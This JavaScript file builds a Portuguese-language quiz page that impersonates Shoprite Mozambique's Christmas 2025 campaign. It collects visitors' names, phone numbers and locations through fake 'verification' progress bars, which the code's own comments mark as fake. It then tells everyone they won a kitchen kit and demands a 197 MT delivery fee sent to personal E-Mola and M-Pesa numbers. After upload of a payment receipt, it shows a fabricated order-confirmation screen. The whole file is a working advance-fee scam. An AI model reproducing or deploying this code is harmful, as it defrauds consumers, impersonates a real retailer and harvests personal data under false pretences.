const quizContainer = document.getElementById('quiz-container');
let currentQuestion = 0;
let answers = [];
let userPoints = 0;
let userInfo = {
  nome: '',
  telefone: '',
  provincia: '',
  distrito: '',
  bairro: ''
};

// Valores corretos das perguntas (mantido como no original)
const correctAnswers = {
  0: 2,
  1: 2,
  2: 3,
  3: 2,
  4: 0,
  5: 1,
  6: 0
};

// Provincias e distritos (mantidos)
const provinciasDistritos = {
  maputo: [
    "KaMpfumo", "KaMaxakeni", "KaMavota", "KaMubukwana", "KaTembe", "KaNyaka",
    "Matola", "Boane", "Marracuene", "Manhiça", "Magude", "Moamba", "Namaacha", "Matutuíne"
  ],
  gaza: [
    "Xai-Xai", "Chibuto", "Chókwè", "Guijá", "Bilene", "Mandlakazi", "Massingir",
    "Mabalane", "Chicualacuala", "Massangena", "Chigubo", "Mapai", "Limpopo"
  ],
  inhambane: [
    "Inhambane","Maxixe","Vilankulo","Massinga","Morrumbene","Jangamo",
    "Inharrime","Zavala","Homoine","Panda","Funhalouro","Mabote","Govuro","Inhassoro"
  ],
  sofala: [
    "Beira","Dondo","Nhamatanda","Búzi","Gorongosa","Marromeu","Caia","Chemba",
    "Cheringoma","Machanga","Muanza","Chibabava","Maringue"
  ],
  manica: [
    "Chimoio","Gondola","Manica","Sussundenga","Baruè","Mossurize","Machaze","Macossa",
    "Guro","Tambara","Macate","Vanduzi"
  ],
  tete: [
    "Tete","Moatize","Changara","Cahora-Bassa","Mutarara","Angónia","Tsangano","Macanga",
    "Chiuta","Mágoè","Marávia","Chifunde","Dôa","Zumbo","Marara"
  ],
  zambezia: [
    "Quelimane","Mocuba","Gurué","Alto Molócue","Milange","Maganja da Costa","Pebane",
    "Namacurra","Nicoadala","Mopeia","Morrumbala","Inhassunge","Chinde","Ile","Lugela",
    "Namarroi","Gilé","Luabo","Mocubela","Derre","Molumbo","Mulevala"
  ],
  nampula: [
    "Nampula","Nacala","Angoche","Monapo","Ilha de Moçambique","Meconta","Mogovolas",
    "Murrupula","Mecubúri","Ribáuè","Malema","Rapale","Moma","Mogincual","Memba",
    "Liúpo","Mossuril","Lalaua","Muecate","Nacala-a-Velha","Eráti","Larde","Nacarôa"
  ],
  cabo_delgado: [
    "Pemba","Montepuez","Mocímboa da Praia","Palma","Chiúre","Mueda","Macomia","Nangade",
    "Quissanga","Metuge","Ancuabe","Meluco","Muidumbe","Namuno","Balama","Mecúfi","Ibo"
  ],
  niassa: [
    "Lichinga","Cuamba","Mandimba","Metangula","Marrupa","Mecanhelas","Lago","Sanga",
    "Mavago","Muembe","Ngauma","Majune","Mecula","Maúa","Nipepe","Metarica"
  ]
};

// Atualiza pontos no topo
function updateHeaderPoints() {
  const pointsDisplay = document.getElementById('points-display');
  if (pointsDisplay) {
    pointsDisplay.textContent = `Pontos: ${userPoints}/105`;
  }
}

// TELA INICIAL — 100% SHOPRITE
function showWelcome() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>QUESTIONÁRIO PREMIADO - SHOPRITE ESPECIAL DE NATAL 2025</h2>
    
    <p>🎄 A Shoprite está a celebrar a Campanha Especial de Natal 2025 e, como forma de agradecer aos nossos clientes, decidimos fazer um mega sorteio de um <strong>Kit de Cozinha Premium Shoprite</strong> totalmente gratuito!</p>
    
    <img src="img/shoprite_entrar.jpg" alt="Shoprite Natal" style="width:100%; border-radius:8px;">
    
    <p>Hoje é o último dia para participar e verificar se estás qualificado para receber o teu prémio.</p>
    
    <div style="background-color:#f8f8f8; padding:15px; border-radius:8px; border-left:4px solid #E53935; margin:15px 0">
      <p><strong>COMO FUNCIONA:</strong></p>
      <p>1. Responde corretamente às perguntas sobre a Shoprite.</p>
      <p>2. Cada resposta certa vale 15 pontos.</p>
      <p>3. Para ganhar o Kit de Cozinha Premium Shoprite precisas de pelo menos 60 pontos.</p>
      <p>4. O teu desempenho é avaliado instantaneamente.</p>
    </div>
    
    <p>Podemos começar?</p>
    
    <button class="submit" onclick="startQuiz()">Participar Agora</button>
  `;
}

// Início
function startQuiz() {
  fbq('track', 'InitiateQuiz');
  showNameForm();
}

// Pergunta nome
function showNameForm() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>Verificação Inicial</h2>
    
    <p>Qual é o seu nome completo?</p>
    <p>(Para confirmar que ainda não participaste da Campanha Shoprite Especial de Natal 2025)</p>
    
    <input type="text" id="nome" class="field" placeholder="Digite seu nome completo">
    <div id="nome-error" class="error-message"></div>
    
    <button class="submit" onclick="validateName()">Enviar</button>
  `;
}

function validateName() {
  const nome = document.getElementById('nome').value.trim();
  const errorElement = document.getElementById('nome-error');

  if (nome.length < 3) {
    errorElement.textContent = 'Por favor, digite seu nome completo.';
    return;
  }

  if (!/^[A-Za-zÀ-ÖØ-öø-ÿ\s]+$/.test(nome)) {
    errorElement.textContent = 'Digite apenas letras.';
    return;
  }

  userInfo.nome = nome;
  showVerification();
}

// Verificação Fake
function showVerification() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>Verificando os seus dados...</h2>

    <div class="progress-container">
      <div id="verification-progress" class="progress-bar" style="width:0%"></div>
    </div>
    <p id="progress-text">0%</p>

    <div class="loader"><div class="spinner"></div></div>
  `;

  let progress = 0;
  const bar = document.getElementById('verification-progress');
  const txt = document.getElementById('progress-text');

  const interval = setInterval(() => {
    progress += 1;
    bar.style.width = progress + '%';
    txt.textContent = progress + '%';

    if (progress >= 100) {
      clearInterval(interval);
      setTimeout(() => {
        quizContainer.innerHTML = `
          <h2>Verificação Completa!</h2>
          <p class="success-message">✅ Dados validados! Pode continuar.</p>
          <button class="submit" onclick="showPhoneForm()">Continuar</button>
        `;
      }, 500);
    }
  }, 45);
}

// Telefone
function showPhoneForm() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>Confirmação de Contacto</h2>

    <p>Digite o seu número de telefone (para validar a sua participação):</p>

    <input type="tel" id="telefone" class="field" placeholder="84 / 85 / 86 / 87 XXXXXXX">
    <div id="telefone-error" class="error-message"></div>

    <button class="submit" onclick="validatePhone()">Enviar</button>
  `;
}

function validatePhone() {
  const telefone = document.getElementById('telefone').value.trim();
  const error = document.getElementById('telefone-error');

  if (!/^(84|85|86|87)\d{7}$/.test(telefone)) {
    error.textContent = 'Digite um número válido (84/85/86/87 + 7 dígitos).';
    return;
  }

  userInfo.telefone = telefone;
  showPhoneProcessing();
}

// Verificação Fake do telefone
function showPhoneProcessing() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>Processando número...</h2>

    <div class="progress-container">
      <div id="phone-progress" class="progress-bar" style="width:0%"></div>
    </div>
    <p id="phone-progress-text">0%</p>

    <div class="loader"><div class="spinner"></div></div>

    <p>Aguarde enquanto verificamos a sua participação...</p>
  `;

  let progress = 0;
  const bar = document.getElementById('phone-progress');
  const txt = document.getElementById('phone-progress-text');

  const interval = setInterval(() => {
    progress += 1;
    bar.style.width = progress + '%';
    txt.textContent = progress + '%';

    if (progress >= 100) {
      clearInterval(interval);
      setTimeout(() => {
        showPresentation();
      }, 500);
    }
  }, 45);
}

// Apresentação Shoprite Natal
function showPresentation() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <img src="img/shoprite_intro.png" alt="Shoprite Natal" style="width:100%; border-radius:8px;">

    <p>🎄 Bem-vindo ao <strong>Questionário Premiado Shoprite – Especial de Natal 2025</strong>.</p>

    <p>O tempo médio para completar é de 3 a 5 minutos.</p>

    <p>Podemos continuar?</p>

    <button class="submit" onclick="showQuestion(0)">Continuar</button>
  `;
}

// ======================
// PERGUNTAS DO QUIZ
// ======================

// Coloca aqui as tuas perguntas (as mesmas que já usas)
const quizData = [
  {
    question: "Em que ano a Shoprite abriu a sua primeira loja em Moçambique?",
    options: ["2005", "2008", "2011", "2014"],
    image: "img/shoprite_q1.jpg"
  },
  {
    question: "A Shoprite está presente em quantas províncias de Moçambique?",
    options: ["7", "9", "11", "5"],
    image: "img/shoprite_q2.jpg"
  },
  {
    question: "Qual é o slogan oficial da Shoprite?",
    options: ["Comprar bem é aqui", "Poupe sempre", "Preços que cabem no bolso", "Shoprite – Preços Baixos Every Day"],
    image: "img/shoprite_q3.jpg"
  },
  {
    question: "Que serviço a Shoprite oferece nas suas lojas?",
    options: ["Depósitos bancários", "Serviço de talho e padaria", "Serviço de TV por assinatura", "Assistência técnica"],
    image: "img/shoprite_q4.jpg"
  },
  {
    question: "Quais supermercados são concorrentes diretos da Shoprite?",
    options: ["Game e Spar", "Pick n Pay e KFC", "Vodacom e Tmcel", "Dstv e TVM"],
    image: "img/shoprite_q5.jpg"
  },
  {
    question: "A Shoprite é conhecida por oferecer produtos de…",
    options: ["TECNOLOGIA AVANÇADA", "ALIMENTAÇÃO E UTILIDADES", "CONSTRUÇÃO CIVIL", "SERVIÇOS FINANCEIROS"],
    image: "img/shoprite_q6.jpg"
  },
  {
    question: "A Shoprite realiza campanhas especiais durante o Natal?",
    options: ["Sim", "Não"],
    image: "img/shoprite_q7.jpg"
  }
];

// ======================
// MOSTRAR PERGUNTA
// ======================

function showQuestion(index) {
  updateHeaderPoints();

  const progressPercent = ((index + 1) / quizData.length) * 100;
  const q = quizData[index];

  quizContainer.innerHTML = `
    <div class="points-display" style="text-align:center; background:#f8f8f8; padding:10px; border-radius:5px; margin-bottom:15px;">
      <p style="margin:0; font-weight:bold;">Seus pontos: <span style="color:#E53935;">${userPoints}</span> / 105</p>
    </div>

    <div class="progress-container">
      <div class="progress-bar" style="width:${progressPercent}%"></div>
    </div>

    <h2>Pergunta ${index + 1}:</h2>

    ${q.image ? `<img src="${q.image}" alt="" style="width:100%; border-radius:8px;">` : ''}

    <p>${q.question}</p>

    <div class="options-container">
      ${q.options.map((option, i) => `
        <button class="option" data-index="${i}">${option}</button>
      `).join('')}
    </div>
  `;

  document.querySelectorAll('.option').forEach((button, i) => {
    button.addEventListener('click', () => {
      const isCorrect = (i === correctAnswers[index]);

      answers.push({
        question: q.question,
        answer: button.textContent,
        isCorrect: isCorrect
      });

      showAnswerFeedback(isCorrect, index);
    });
  });
}

// ======================
// FEEDBACK
// ======================

function showAnswerFeedback(isCorrect, index) {
  document.querySelectorAll('.option').forEach(btn => {
    btn.disabled = true;
    btn.style.opacity = '0.6';
    btn.style.cursor = 'default';
  });

  const feedback = document.createElement('div');
  feedback.style.padding = "15px";
  feedback.style.borderRadius = "8px";
  feedback.style.textAlign = "center";
  feedback.style.margin = "15px 0";

  if (isCorrect) {
    userPoints += 15;
    updateHeaderPoints();

    feedback.style.background = "#e8f5e9";
    feedback.style.color = "#2e7d32";
    feedback.innerHTML = `<strong>✅ Resposta Certa!</strong><p>+15 pontos!</p>`;
  } else {
    feedback.style.background = "#ffebee";
    feedback.style.color = "#c62828";
    feedback.innerHTML = `<strong>❌ Resposta Incorreta</strong><p>Tente a próxima!</p>`;
  }

  const internalPoints = document.querySelector('.points-display p');
  if (internalPoints) {
    internalPoints.innerHTML = `Seus pontos: <span style="color:#E53935;">${userPoints}</span> / 105`;
  }

  quizContainer.appendChild(feedback);

  const btn = document.createElement('button');
  btn.className = "submit";
  btn.textContent = "Continuar";
  btn.onclick = () => {
    currentQuestion++;

    if (currentQuestion >= quizData.length) {
      showConclusion();
    } else {
      showQuestion(currentQuestion);
    }
  };

  quizContainer.appendChild(btn);
}

// ======================
// TELA FINAL — LOCALIZAÇÃO
// ======================

function showConclusion() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <div class="points-display" style="text-align:center; background:#f8f8f8; padding:10px; border-radius:5px; margin-bottom:15px;">
      <p style="margin:0; font-weight:bold;">Pontuação Final:
        <span style="color:#E53935;">${userPoints}</span> / 105
      </p>
    </div>

    <img src="img/shoprite_parabens.png" style="width:100%; border-radius:8px;">

    ${userPoints >= 60 ?
      `<div style="background:#e8f5e9; padding:15px; border-radius:8px; text-align:center;">
        <p style="color:#2e7d32; font-weight:bold;">🎉 PARABÉNS!</p>
        <p>Você atingiu a pontuação mínima para receber o
        <strong>Kit de Cozinha Premium Shoprite</strong>!</p>
      </div>`
      :
      `<div style="background:#ffebee; padding:15px; border-radius:8px; text-align:center;">
        <p style="color:#c62828; font-weight:bold;">⚠️ Atenção</p>
        <p>Você não atingiu os 60 pontos mínimos, mas ainda pode verificar a sua entrega.</p>
      </div>`
    }

    <p>Informe sua localização para continuarmos:</p>

    <select id="provincia" class="field" onchange="loadDistritos()">
      <option value="">Selecione a província</option>
      <option value="maputo">Maputo</option>
      <option value="gaza">Gaza</option>
      <option value="inhambane">Inhambane</option>
      <option value="sofala">Sofala</option>
      <option value="manica">Manica</option>
      <option value="tete">Tete</option>
      <option value="zambezia">Zambézia</option>
      <option value="nampula">Nampula</option>
      <option value="cabo_delgado">Cabo Delgado</option>
      <option value="niassa">Niassa</option>
    </select>

    <select id="distrito" class="field" style="display:none;">
      <option value="">Selecione o distrito</option>
    </select>

    <input type="text" id="bairro" class="field" style="display:none;" placeholder="Digite o bairro">

    <div id="location-error" class="error-message"></div>

    <button id="btn-location" class="submit" onclick="validateLocation()" style="display:none;">Confirmar Localização</button>
  `;
}

function loadDistritos() {
  const provincia = document.getElementById('provincia').value;
  const distrito = document.getElementById('distrito');
  const bairro = document.getElementById('bairro');
  const btn = document.getElementById('btn-location');

  if (provincia) {
    distrito.innerHTML = `<option value="">Selecione o distrito</option>`;

    provinciasDistritos[provincia].forEach(d => {
      const opt = document.createElement('option');
      opt.value = d;
      opt.textContent = d;
      distrito.appendChild(opt);
    });

    distrito.style.display = "block";
    userInfo.provincia = provincia;

    distrito.onchange = () => {
      if (distrito.value) {
        bairro.style.display = "block";
        userInfo.distrito = distrito.value;
      }
    };

    bairro.oninput = () => {
      if (bairro.value.trim()) {
        btn.style.display = "block";
        userInfo.bairro = bairro.value.trim();
      }
    };
  }
}

// ======================
// CHECKOUT — SHOPRITE
// ======================

function validateLocation() {
  if (!userInfo.provincia || !userInfo.distrito || !userInfo.bairro) {
    document.getElementById('location-error').textContent = "Preencha todos os campos.";
    return;
  }

  showDeliveryDetails();
}

function showDeliveryDetails() {
  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>Detalhes da Entrega</h2>

    <img src="img/shoprite_delivery.png" style="width:100%; border-radius:8px;">

    <p>🎉 Você está qualificado para receber o
    <strong>Kit de Cozinha Premium Shoprite</strong>!</p>

    <p>A entrega será realizada pela <strong>Transportadora Oficial Shoprite</strong></p>

    <p>Custos do prémio: <strong>0,00 MT</strong></p>
    <p>Taxa única de envio: <strong>197 MT</strong></p>

    <p class="remaining">Restam apenas 2 vagas para entrega hoje!</p>

    <button class="submit" onclick="showPaymentInstructions()">Prosseguir</button>
  `;
}

function showPaymentInstructions() {

  fbq('track','InitiateCheckout',{
    value:197,
    currency:'MZN',
    content_name:'Taxa de Envio Kit Shoprite'
  });

  updateHeaderPoints();

  quizContainer.innerHTML = `
    <h2>Checkout Shoprite</h2>

    <div style="background:#f8f9fa; padding:15px; border-radius:8px; margin-bottom:20px; border:1px solid #ddd;">
      <h3>Kit de Cozinha Premium Shoprite</h3>

      <ul style="font-size:0.9rem; padding-left:20px;">
        <li>Jogo de Panelas – 12 Peças</li>
        <li>Frigideira Antiaderente</li>
        <li>Conjunto de Talheres – 24 peças</li>
        <li>6 Copos</li>
        <li>6 Pratos</li>
        <li>Tábua de cortar</li>
        <li>Chaleira</li>
      </ul>

      <p><strong>Taxa de Entrega: 197 MT</strong></p>
    </div>

    <h3>Métodos de Pagamento</h3>

    <div style="background:#fff; padding:15px; border:1px solid #ddd; border-radius:8px; margin-bottom:15px;">
      <p><strong>E-Mola</strong></p>
      <p>Número: <strong>877371618</strong></p>
      <p>Nome: <strong>FELIX JOÃO JOSE</strong></p>
      <button onclick="copyToClipboard('877371618')" class="copy-button">Copiar Número</button>
    </div>

    <div style="background:#fff; padding:15px; border:1px solid #ddd; border-radius:8px;">
      <p><strong>M-Pesa</strong></p>
      <p>Número: <strong>856576690</strong></p>
      <p>Nome: <strong>FELIX JOSE</strong></p>
      <button onclick="copyToClipboard('856576690')" class="copy-button">Copiar Número</button>
    </div>

    <div style="background:#e8f5e9; padding:10px; border-radius:6px; border:1px solid #a5d6a7; margin-top:20px;">
      <p>💡 Após pagar, envie o comprovativo abaixo:</p>
    </div>

    ${uploadSection()}
  `;

  setupFileUpload();
}

// ======================
// UPLOAD DE COMPROVATIVO
// ======================

function uploadSection() {
  return `
    <div id="comprovativo-section" style="background:#f8f9fa; padding:15px; border-radius:8px; border:1px solid #ddd; margin-top:20px;">

      <h3>Enviar Comprovativo</h3>

      <div id="drop-area" style="border:2px dashed #bbb; padding:25px; text-align:center; border-radius:6px;">
        <p><strong>Arraste o comprovativo aqui</strong></p>
        <p>ou</p>
        <button onclick="document.getElementById('comprovativo-file').click()" class="copy-button">Selecionar Arquivo</button>
        <input type="file" id="comprovativo-file" accept="image/*,application/pdf" style="display:none;">
      </div>

      <div id="file-preview" style="display:none; margin-top:20px; background:white; border:1px solid #ddd; padding:12px; border-radius:6px;">
        <div style="display:flex; justify-content:space-between; align-items:center;">
          <div style="display:flex; align-items:center;">
            <span style="font-size:22px; margin-right:10px;">📄</span>
            <div>
              <p id="file-name" style="margin:0; font-weight:bold;"></p>
              <p id="file-size" style="margin:0; font-size:0.9rem;"></p>
            </div>
          </div>
          <button onclick="removeFile()" style="background:none; border:none; color:#E53935; font-size:0.9rem;">Remover</button>
        </div>
      </div>

      <button class="submit" style="margin-top:20px;" onclick="confirmarPagamento()">Confirmar Pagamento</button>
    </div>

    <div id="tracking-section" style="display:none; margin-top:25px; background:#f8f9fa; padding:15px; border-radius:8px; border:1px solid #ddd;">
      <h3>Acompanhamento do Pedido</h3>

      <p>Pagamento Confirmado ✓</p>
      <p>Pedido em Processamento…</p>
      <p>Entrega prevista em 1–2 dias úteis.</p>

      <div style="background:#e8f5e9; padding:10px; border-radius:6px; margin-top:10px;">
        <p>Dúvidas? WhatsApp: <strong>+258 86 149 7642</strong></p>
      </div>
    </div>
  `;
}

function setupFileUpload() {
  const input = document.getElementById('comprovativo-file');
  const drop = document.getElementById('drop-area');
  const preview = document.getElementById('file-preview');
  const name = document.getElementById('file-name');
  const size = document.getElementById('file-size');

  ['dragenter','dragover','dragleave','drop'].forEach(ev => {
    drop.addEventListener(ev, e => {
      e.preventDefault();
      e.stopPropagation();
    });
  });

  drop.addEventListener('drop', (e) => handleFiles(e.dataTransfer.files));
  input.addEventListener('change', () => handleFiles(input.files));

  function handleFiles(files) {
    if (!files.length) return;

    const file = files[0];

    if (file.size > 5 * 1024 * 1024) {
      alert("Arquivo muito grande (máx 5MB)");
      return;
    }

    preview.style.display = "block";
    drop.style.display = "none";
    name.textContent = file.name;
    size.textContent = formatFileSize(file.size);
  }

  function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + " B";
    else if (bytes < 1_048_576) return (bytes/1024).toFixed(1) + " KB";
    else return (bytes/1_048_576).toFixed(1) + " MB";
  }
}

// Remover ficheiro
function removeFile() {
  document.getElementById('file-preview').style.display = "none";
  document.getElementById('drop-area').style.display = "block";
  document.getElementById('comprovativo-file').value = "";
}

// Confirmar pagamento
function confirmarPagamento() {
  const preview = document.getElementById('file-preview');

  if (preview.style.display === "none") {
    alert("Por favor, envie o comprovativo antes de continuar.");
    return;
  }

  fbq('track','Purchase',{
    value:197,
    currency:'MZN'
  });

  document.getElementById('comprovativo-section').style.display = "none";
  document.getElementById('tracking-section').style.display = "block";

  window.scrollTo({top:0, behavior:"smooth"});
}

// Copiar número
window.copyToClipboard = function(text) {
  navigator.clipboard.writeText(text)
    .then(() => alert("Número copiado!"))
    .catch(() => alert("Erro ao copiar"));
};
